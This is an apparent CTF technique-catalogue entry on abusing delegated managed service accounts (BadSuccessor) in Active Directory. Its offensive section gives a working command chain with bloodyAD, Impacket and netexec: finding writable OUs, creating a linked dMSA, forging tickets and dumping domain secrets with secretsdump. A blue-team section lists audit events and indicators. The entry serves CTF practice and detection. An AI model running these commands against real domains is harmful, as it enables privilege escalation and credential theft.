# CTFTCTE-FPN-021 — Enumerate OU create rights and mint a linked successor account

> **Type:** Counter-Technique  
> **Tactic:** [`CTFT-TA-FPN`](../tactics/CTFT-TA-FPN.md) — Full Pwn / Multi-Stage  
> **Counters technique:** [`CTFTTE-FPN-021`](../techniques/CTFTTE-FPN-021.md) — Delegated managed service account linked to a privileged predecessor

---

## Offensive Recovery (CTF practitioner / solver)

Read the OU ACLs first; the exploit is worthless without a container where the controlled
principal may create a child object. Enumerate with the delegated-permission view rather
than guessing: an ACL dump of every OU, a graph query for `GenericAll`/`CreateChild` on
organizational units, or the dedicated discovery script when a Windows foothold exists.
Confirm the domain actually supports dMSA before spending a hop on it.

Then perform the gated mutation: create the dMSA in the writable OU, point
`msDS-ManagedAccountPrecededByLink` at the privileged predecessor, set
`msDS-DelegatedMSAState` to *Completed*, request the successor's TGT and act as the
predecessor (directory replication, remote execution). Record the dMSA name and DN so
the object can be deleted afterwards; the predecessor object is never modified, so there
is nothing else to restore.

```bash
# 1. read-only: which OU can the current principal write a child into?
bloodyAD -d corp.local -u user -p 'Passw0rd!' --host DC01.corp.local get writable --detail
nxc ldap DC01.corp.local -u user -p 'Passw0rd!' -d corp.local --dns-server DC01.corp.local -M badsuccessor

# 2. mutation: create the dMSA linked to the predecessor (the successor TGT is saved when the tool manages it)
bloodyAD -d corp.local -u user -p 'Passw0rd!' --host DC01.corp.local add badSuccessor successor_dmsa
#    alternative (Impacket): badsuccessor.py -action add -target-ou <OU DN>
#                            -dmsa-name successor -target-account <predecessor DN>
#    alternative (Windows): SharpSuccessor.exe add /path:<OU DN> /account:user /name:successor /impersonate:Administrator

# 3. if the tool created the object but not the ticket, mint it explicitly
python3 getTGT.py -dc-ip DC corp.local/user:'Passw0rd!'
export KRB5CCNAME=user.ccache
python3 getST.py -k -no-pass -dc-ip DC -impersonate 'successor_dmsa$' -self -dmsa corp.local/user

# 4. act as the predecessor with the successor ticket
export KRB5CCNAME=successor_dmsa.ccache
secretsdump.py -k -no-pass 'successor_dmsa$'@DC01.corp.local

# 5. cleanup: delete the dMSA object
bloodyAD -d corp.local -u user -p 'Passw0rd!' --host DC01.corp.local remove object 'CN=successor_dmsa,OU=LabOU,DC=corp,DC=local'
```

## Forensic / Blue-Team Perspective (DFIR analyst)

The chain leaves directory-service audit records rather than credential theft: an object
creation under an OU (event 5137 for the dMSA class), attribute modifications writing
`msDS-ManagedAccountPrecededByLink` and `msDS-DelegatedMSAState` (5136), and a TGT request
for the dMSA (4768) from an account that had no prior Kerberos activity. The predecessor
object itself is never changed, so hunting must key on the *new* account and on the OU
where it appeared — not on modifications to privileged users.

## Preconditions

- The domain schema supports dMSA (Windows Server 2025 or later functional level).
- The controlled principal can create a child object below some OU (`CreateChild`, or an
  equivalent `GenericAll`/`WriteDacl`/`WriteOwner` grant).
- The target predecessor account is not protected in a way that blocks the link.

## Indicators

- A newly created dMSA whose `msDS-ManagedAccountPrecededByLink` names a privileged account.
- `msDS-DelegatedMSAState` set to *Completed* right after creation.
- A TGT requested by the dMSA for a principal that never authenticated before.
- Directory replication traffic originating from the successor identity.

## Related MITRE ATT&CK

| ATT&CK ID | ATT&CK technique | Relation note |
| --- | --- | --- |
| T1098 | Account Manipulation | The dMSA, its successor link and its migration state are written by a non-privileged principal. |
| T1078.002 | Valid Accounts: Domain Accounts | The successor's ticket acts as the predecessor and its groups. |

## Tools

- [Get-BadSuccessorOUPermissions.ps1](../tools/CTFTTOU-449.md)
- [impacket](../tools/CTFTTOU-116.md) (`badsuccessor.py`, `getTGT.py`, `getST.py`, `secretsdump.py`)
- [netexec](../tools/CTFTTOU-016.md) (`-M badsuccessor`)
- [BloodHound](../tools/CTFTTOU-294.md)

## References

- <https://github.com/akamai/BadSuccessor>
- <https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory>
- <https://github.com/CravateRouge/bloodyAD>
